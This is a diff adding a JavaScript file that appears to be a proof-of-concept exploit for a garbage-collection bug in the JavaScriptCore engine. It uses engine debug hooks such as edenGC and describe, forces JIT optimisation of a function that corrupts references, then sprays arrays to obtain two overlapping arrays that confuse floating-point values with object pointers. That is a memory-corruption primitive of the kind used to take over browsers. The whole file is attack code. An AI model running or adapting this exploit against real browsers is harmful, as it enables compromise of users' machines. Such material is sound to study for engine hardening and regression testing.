@@ -1,0 +1,94 @@
+<script>
+edenGC();
+let hack = 0;
+function recurse_alloc(alloc,size,depth) {
+    if (!size) size = 1;
+    if (!depth) {
+        for (let i = 0; i < size; i++) {
+            alloc[i] = new Array(0);
+        }
+        return;
+    }
+    for (let i = 0; i < size; i++) {
+        alloc[i] = new Array(size);
+        recurse_alloc(alloc[i],size-1,depth-1);
+    }
+}
+function ralloc(sz,depth,i) {
+    let rv = new Array(1);
+    rv[0] = new Array(sz);
+    if (!hack) {
+        for (let i=0; i<sz; i++) rv[0][i] = rv[0];
+    } else
+        recurse_alloc(rv[0],sz,depth);
+    if (hack) {
+        let next = 0;
+        let prev = new Array(1);
+        prev[0] = {a:0,b:0,c:0,d:0};
+        for (let i=0; i<depth; i++) {
+            next = new Array(1);
+            next[0] = prev;
+            prev = next;
+        }
+        rv[0][0]=next;
+    }
+    return rv;
+}
+let fakewait = ralloc(10,10);
+function opt(s,k,ss) {
+    let ls = "A"+s;
+    let longwait = ralloc(ss,k,0);
+    let victim = new Array(8);
+    victim[1] = longwait[0];
+    longwait[0] = victim;
+    ls < "a";
+    victim[0] = victim[1][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0];
+    victim[1][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0][0] = 0;
+    return victim;
+}
+let s = "A";
+for (let i=0; i<1; i++) s+=s;
+for (let i=0; i<10000; i++) opt(s+i,10,2,0);
+for (let i=1; i<25; i++) s+=s;
+edenGC();
+hack = 1;
+let spr = [];
+for (let i=0; i<1000; i++) {
+    for (let i=0; i<1000; i++) {
+        spr[i] = new Array(2).fill(14.47);
+    }
+    let lw = opt(s+"A",20,7);
+    edenGC();
+    for (let i=0; i<100; i++) {
+        let z = {h:new Array(2).fill(13.37),a:0,c:0,k:0};
+        z.h.length = 0x1ff;
+    }
+    edenGC();
+    
+    debug(describe(lw[0]));
+    for (let i=0; i<1000; i++) {
+        spr[i].length = 0x1ff;
+    }
+    let ar_1 = lw[0].h;
+    edenGC();
+    if (!ar_1) throw "fail";
+    lw[0] = 0;
+    let z = {a: ar_1};
+    ar_1[0] = 15.57;
+    let ar_2 = 0;
+    for (let i=0; i<100; i++) {
+        if (spr[i][0] == 15.57) ar_2 = spr[i];
+    }
+    if (!ar_2) throw "fail";
+    debug(describe(ar_2[0]));
+    ar_1[0] = {};
+    debug(describe(ar_2[0]));
+    ar_2[0] = 13.37;
+    debug(describe(ar_1[0]));
+    
+    spr.length = 0;
+    lw.length = 0;
+    gc();
+    
+}
+<script/>
